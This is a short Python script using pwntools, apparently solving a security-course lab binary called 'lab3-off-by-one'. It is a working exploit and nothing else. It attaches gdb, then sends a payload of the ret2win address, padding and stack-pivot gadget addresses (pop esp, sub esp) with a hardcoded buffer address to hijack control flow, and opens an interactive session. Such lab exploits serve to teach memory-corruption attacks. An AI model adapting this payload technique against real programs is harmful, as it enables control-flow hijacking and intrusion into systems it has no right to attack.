from pwn import *

p = process('./lab3-off-by-one')
elf = ELF('./lab3-off-by-one')
context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(p)

ret2win = elf.symbols['ret2win']

buf = 0xffffcc08
pop_esp = 0x0804925e
sub_esp = 0x08049260

payload = p32(ret2win) + b'A'* 1004 + p32(pop_esp) + p32(buf) + p32(0x12345678) + p32(sub_esp)
payload += b'\x00'

p.send(payload)
p.interactive()
